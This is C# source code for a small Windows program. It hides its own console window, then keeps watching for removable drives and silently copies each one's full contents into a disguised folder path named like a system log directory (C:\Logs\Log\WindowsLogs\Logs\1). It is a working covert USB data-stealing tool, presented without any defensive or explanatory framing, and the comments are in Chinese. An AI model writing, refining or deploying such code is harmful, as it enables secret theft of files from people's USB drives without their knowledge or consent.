using System;
using System.IO;
using System.Collections.Generic;
using System.Threading;

// Powered By Yanda2008 
// 最后修改日期2023年/11月/18日
class LiberatorsX
{
    static HashSet<string> okcopy = new HashSet<string>();
    static bool zzcopy = false;

    // 隐藏控制台
    const int SW_HIDE = 0;
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    // 主程序入口
    static void Main(string[] args)
    {
        // 隐藏控制台
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // 持续监测可移动驱动器
        while (true)
        {
            var alldrives = DriveInfo.GetDrives();
            bool newdrive = false;

            foreach (var driveing in alldrives)
            {
                if (IsRemovableDrive(driveing.Name) && !okcopy.Contains(driveing.Name))
                {
                    string todaytime = DateTime.Now.ToString("yyyyMMddHHmmss"); // 时间
                    string mbdire = Path.Combine("C:\\Logs\\Log\\WindowsLogs\\Logs\\1", todaytime);
                    string sdire233 = driveing.RootDirectory.FullName;

                    // 如果目标文件夹不存在，创建
                    if (!Directory.Exists(mbdire))
                    {
                        Directory.CreateDirectory(mbdire);
                    }

                    zzcopy = true;
                    // 复制文件夹
                    if (CopyDirectory(sdire233, mbdire))
                    {
                        okcopy.Add(driveing.Name);
                        newdrive = true;
                        zzcopy = false;
                    }
                    else
                    {
                        zzcopy = false;
                        break;
                    }
                }
            }

            // 如果没有找到新的驱动器并且不在复制中，等待5秒钟再继续检查
            if (!newdrive && !zzcopy)
            {
                Thread.Sleep(5000);
            }
        }
    }

    // 复制文件夹
    static bool CopyDirectory(string sdire233, string mbdire)
    {
        try
        {
            Directory.CreateDirectory(mbdire);
            foreach (string sour112 in Directory.GetFiles(sdire233))
            {
                string ylfile = Path.Combine(mbdire, Path.GetFileName(sour112));
                File.Copy(sour112, ylfile, true);
            }
            foreach (string ywjzwj in Directory.GetDirectories(sdire233))
            {
                string copysub = Path.Combine(mbdire, Path.GetFileName(ywjzwj));
                CopyDirectory(ywjzwj, copysub);
            }
            return true;
        }
        catch (IOException)
        {
            return false;
        }
    }

    // 判断是否为可移动驱动器
    static bool IsRemovableDrive(string path)
    {
        DriveInfo drive = new DriveInfo(Path.GetPathRoot(path));
        return drive.DriveType == DriveType.Removable;
    }
}
